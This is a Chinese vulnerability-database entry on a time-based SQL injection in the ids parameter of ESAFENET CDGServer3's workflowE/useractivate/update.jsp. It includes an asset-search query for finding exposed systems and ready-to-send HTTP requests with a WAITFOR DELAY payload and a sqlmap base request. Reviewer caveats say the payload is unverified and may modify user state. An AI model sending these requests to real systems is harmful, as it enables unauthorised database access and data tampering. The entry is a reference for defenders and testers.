---
source: "wy876 漏洞文库"
title: "亿赛通CDGServer3 workflowE useractivate/update.jsp ids SQL注入"
product: "亿赛通CDGServer3"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server；版本未知"
prerequisites: "无Cookie请求，鉴权未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/tmm1ig5i22zrmpdp"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BA%BF%E8%B5%9B%E9%80%9A/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fids%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name="
hunter: "app.name=\"ESAFENET 亿赛通文档安全管理系统\""
id: "vw-62a3d1094572c5b8b40e905d"
entity_id: "ve-62a3d1094572c5b8b40e905d"
schema_version: "1"
---

# 亿赛通CDGServer3 workflowE useractivate/update.jsp ids SQL注入

## 条目说明

- 对象与具体问题：亿赛通CDGServer3；workflowE useractivate/update.jsp ids SQL注入
- 版本、配置及部署条件：SQL Server；版本未知
- 认证与权限前提：无Cookie请求，鉴权未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 标题仅ids参数名不可定位功能，应含useractivate/update.jsp
- flag1和ids1,3可能更新用户激活状态，延时探针与基准均可改业务
- 5秒无计时对照；基准ids1,3)带多余括号，不能当正常请求
- 缺版本/源码/修复，保留不同SQLi端点

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统ids存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

## 二、影响版本
+ 亿赛通电子文档安全管理系统

## 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面


## 四、漏洞复现
```http
GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3)WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Upgrade-Insecure-Requests: 1
```


sqlmap

```http
GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3)%20 HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tmm1ig5i22zrmpdp>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
